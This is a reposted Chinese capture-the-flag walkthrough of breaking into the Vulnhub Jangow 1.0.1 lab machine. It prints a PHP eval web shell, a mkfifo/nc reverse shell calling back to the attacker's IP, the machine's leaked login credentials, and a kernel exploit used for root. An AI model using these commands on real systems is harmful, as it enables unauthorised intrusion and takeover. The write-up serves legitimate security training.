> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kJLViHs4_98zyHR-EqhwCA)

**前期准备：**

```
`靶机下载地址：https://www.vulnhub.com/entry/jangow-101,754/``kali攻击机IP：192.168.1.130``靶机地址：192.168.1.139`
```

一、信息收集
------

#### 1.使用nmap扫描靶机地址

```
nmap -p 1-65535 -A -sV 192.168.1.139
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEnPhvWy3UrcUDhzJnfYf62ribUdFLIPxSZOuXyO3txXV0knziaAaExicJr29vhMkrxl4TF9NFKwFM6Dw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

发现开放了21和80端口，查看一下80端口。

#### 2.收集网站信息

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

检查页面后发现Buscar页面有个可疑的地方：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

做一下测试：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现可以执行系统指令。

二、漏洞攻击
------

直接写入一句话木马试一下：

```
echo '<?php eval($_POST["sain"]);' > sain.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

返回200，用蚁剑链接一下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

连接成功。简单查看一下文件，在/var/www/html/site/wordpress下也发现了配置文件：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

除此之外发现在/var/www/html下有一个./backup文件：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现都是数据库的用户名和密码，但是jangow01和系统名字一样，所以我就尝试下直接登录系统，发现可以直接登陆进去：

```
`username = "jangow01"``password = "abygurl69"`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以直接在系统里进行提权做，但是通常是写入反弹shell连接，然后发现 nc 中的 -e 参数无法使用

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

除此之外也尝试了好几种反弹shell，发现存在端口限制，试了好几个端口后发现443端口能用，因为网站使用的是php语言，所以写入一个php反弹shell文件：

```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.130 443 >/tmp/f');?>
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

kali上开启监听，并且访问 反弹shell的php文件：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现连接成功，写入交互式shell：

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

再升级一下 shell。在home目录下发现一个user.txt文件：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

用md5解不出来，然后查看一下系统版本，看看有没有可利用的漏洞：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

三、提权
----

靶机环境是ubuntu16.04，使用 searchsploit 看看有没有什么可利用的漏洞

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

试了好几个后发现 45010.c 可以利用，把45010.c文件传送到靶机中，我这开个http服务：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

赋一下权限（**一开始我用的 jangow01 用户做的，发现无法赋权，后来试了下 www-data 可以**）：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

先用 gcc 运行一下45010.c文件：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

生成一个 a.out 文件，运行a.out文件，得到root权限，查看flag：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

作者：sainet，文章转载于博客园。

**往期精彩推荐**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

[记一次搭建靶场渗透过程（1）](http://mp.weixin.qq.com/s?__biz=MzkwNzI0MTQzOA==&mid=2247483876&idx=1&sn=e1a36f5c075ed6efc7d6f4fd4ab76cd7&chksm=c0dd7355f7aafa43b26e0d175b58f85c7424a025cbf7b62e65d9b68a41f94e38ba816fddc261&scene=21#wechat_redirect)  

[记一次搭建靶场渗透过程（2）](http://mp.weixin.qq.com/s?__biz=MzkwNzI0MTQzOA==&mid=2247483903&idx=1&sn=891ec97e333fa955191ef28cd2c2a088&chksm=c0dd734ef7aafa5863337a3abce5be36debd3cddbd22debe38f36a6534b23d35a6e6dc11386b&scene=21#wechat_redirect)

[记一次搭建靶场渗透过程（3）](http://mp.weixin.qq.com/s?__biz=MzkwNzI0MTQzOA==&mid=2247483959&idx=1&sn=40c3bd991e58106adbf910d103af18b8&chksm=c0dd7086f7aaf990e0bad981bd842e388c80b46044542aa157dcf83165dfb966d09c91c6a927&scene=21#wechat_redirect)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

           **团队介绍**

银河护卫队super，是一个致力于红队攻防实战、内网渗透、代码审计、安卓逆向、安全运维等技术干货分享的队伍，定期分享常用渗透工具、复现教程等资源。欢迎有想法、乐于分享的具备互联网分享精神的安全人士进行交流学习。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

点击关注银河护卫队super

 ![](http://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEklkWjIl0RzCibFSpMUlVqBN8oNxMvY6GRc67IcBDthxMpN3QGFB40rsmoO3412j5OuCsAyMwHy8icA/0?wx_fmt=png) ** 银河护卫队super ** 银河护卫队super，是一个致力于红队攻防实战、内网渗透、代码审计、安卓逆向、安全运维等技术干货分享的队伍，定期分享常用渗透工具、复现教程等资源。 欢迎有想法、乐于分享的具备互联网分享精神的安全人士进行交流学习。 26篇原创内容   公众号